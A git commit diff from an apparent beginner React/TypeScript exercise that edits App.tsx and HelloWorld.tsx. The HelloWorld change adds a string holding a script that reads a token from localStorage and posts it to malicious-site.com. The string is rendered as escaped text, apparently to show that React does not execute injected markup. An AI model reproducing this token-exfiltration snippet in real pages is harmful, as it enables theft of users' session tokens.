b192a917748391f2c88cc0b9d9ff6e994e7af05d
fagneraureliano <fagner@FAGNER-NOTE.localdomain>
2022-03-21 19:01:43 -0300

    aa

--- src/App.tsx
+++ src/App.tsx
@@ -1,25 +1,28 @@
 import React from 'react';
 import logo from './logo.svg';
 import './App.css'; 
-import HelloWorld from './HelloWorld';
+// import HelloWorld from './HelloWorld';
+
+const Component = React.createElement('div', { style: { background: 'red' } }, 'Olá, Mundo!!')
+
+
+const HTMLElement = document.createElement('div')
+HTMLElement.style.background = 'red'
+HTMLElement.innerText = 'Olá, mundo!'
+
+console.log(Component);
+console.dir(HTMLElement);
 
 function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <HelloWorld />
+        {Component}
+        {/* <HelloWorld /> */}
         <img src={logo} className="App-logo" alt="logo" />
         <p>
           Edit <code>src/App.tsx</code> and save to reload.
         </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
       </header>
     </div>
   );
--- src/HelloWorld.tsx
+++ src/HelloWorld.tsx
@@ -1,5 +1,19 @@
 export default function hello() {
-  const name: string = "Luciene";
+  const name: string = "Lucienie";
+  
+  const title = <h1>Hello, {name}</h1>
+  const maliciousScript = `
+  <script>
+    const token = window.localStorage.getItem('token');
+    fetch('https://malicious-site.com/get-token', {
+      method: 'POST',
+      body: { token }
+    })
+    console.log('sent')
+  </script>
+`
+
+
 
   if (name === "Lu") {
     return (
@@ -10,7 +24,8 @@ export default function hello() {
   }
   return (
     <div>
-      <h1>Hello, {name === "Luciene" ? "Luuu" : "Lucy"}!</h1>
+      {maliciousScript}
+      <h1  tabIndex={0} >Hello, {name === "Luciene" ? "Luuu" : "Lucy"}! </h1>
     </div>
   );
 }
